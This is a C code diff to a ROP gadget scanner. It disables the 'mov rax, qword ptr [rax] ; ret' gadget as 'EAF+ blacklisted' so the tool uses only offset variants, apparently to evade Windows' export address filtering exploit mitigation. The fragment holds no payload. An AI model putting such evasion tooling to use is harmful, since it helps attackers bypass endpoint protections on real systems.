@@ -25,6 +25,8 @@ int find_mov_req_qword_ptr(char * pMem, int size, int * ptr_offset, char * negat
     0x0000000180088fd5 : mov rax, qword ptr [rax] ; ret
     */
 
+    // mov rax, qword ptr [rax] ; ret - this gadget would get caught by EAF+
+
     // Look for 48 8b, size - max_gadget to not cause access violation
 	for (i = 0; i < size - max_gadget; i++) {
 		if (!help_memcmp(pMem + i, mov_rax_qword_ptr, mov_size)) {
@@ -34,13 +36,14 @@ int find_mov_req_qword_ptr(char * pMem, int size, int * ptr_offset, char * negat
             // Now decide if it's the right gadget based on the third mov argument and ret opcode with cc after it
             // (There is probably a better way)
 
-            short int first_bool = gadget_memory[2] == '\x00' && gadget_memory[3] == '\xc3' && gadget_memory[4] == '\xcc';
+            //short int first_bool = gadget_memory[2] == '\x00' && gadget_memory[3] == '\xc3' && gadget_memory[4] == '\xcc';
+            // EAF+ blacklisted
 
             short int second_bool = gadget_memory[2] == '\x40' && gadget_memory[4] == '\xc3' && gadget_memory[5] == '\xcc';
 
             short int third_bool = gadget_memory[2] == '\x80' && gadget_memory[7] == '\xc3' && gadget_memory[8] == '\xcc';
 
-            if (first_bool || second_bool || third_bool) {
+            if (second_bool || third_bool) {
 
                 // We have one of the gadgets and now we need to figure out the outputs based on the third mov argument
                 // There could be any registers or qword pointer to different registers
@@ -48,7 +51,9 @@ int find_mov_req_qword_ptr(char * pMem, int size, int * ptr_offset, char * negat
                 int convert = 0;
                 char * convert_ptr = &convert;
                 switch(gadget_memory[2]){
-                    case '\x00':
+
+                    // EAF+ blacklisted
+                    /*case '\x00':
 
                         // Basic gadget doesn't have any offset to the pointer
                         // And the signess doesn't really matter
@@ -58,6 +63,8 @@ int find_mov_req_qword_ptr(char * pMem, int size, int * ptr_offset, char * negat
                         *negative = 0;
 
                         break;
+                        
+                    */
 
                     case '\x40':
 
@@ -171,17 +178,20 @@ int find_mov_req_qword_ptr(char * pMem, int size, int * ptr_offset, char * negat
 
             char * gadget_memory = (pMem + i);
 
-            short int first_bool = gadget_memory[1] == '\x00' && gadget_memory[2] == '\xc3' && gadget_memory[3] == '\xcc';
+            //short int first_bool = gadget_memory[1] == '\x00' && gadget_memory[2] == '\xc3' && gadget_memory[3] == '\xcc';
 
             short int second_bool = gadget_memory[1] == '\x40' && gadget_memory[3] == '\xc3' && gadget_memory[4] == '\xcc';
 
             short int third_bool = gadget_memory[1] == '\x80' && gadget_memory[6] == '\xc3' && gadget_memory[7] == '\xcc';
 
-            if (first_bool || second_bool || third_bool) {
+            if (second_bool || third_bool) {
 
                 int convert = 0;
                 char * convert_ptr = &convert;
                 switch(gadget_memory[1]){
+
+                    // EAF+ blacklisted
+                    /*
                     case '\x00':
 
                         // Basic gadget doesn't have any offset to the pointer
@@ -192,7 +202,7 @@ int find_mov_req_qword_ptr(char * pMem, int size, int * ptr_offset, char * negat
                         *negative = 0;
 
                         break;
-
+                    */
                     case '\x40':
 
                         // We have a char size integer here
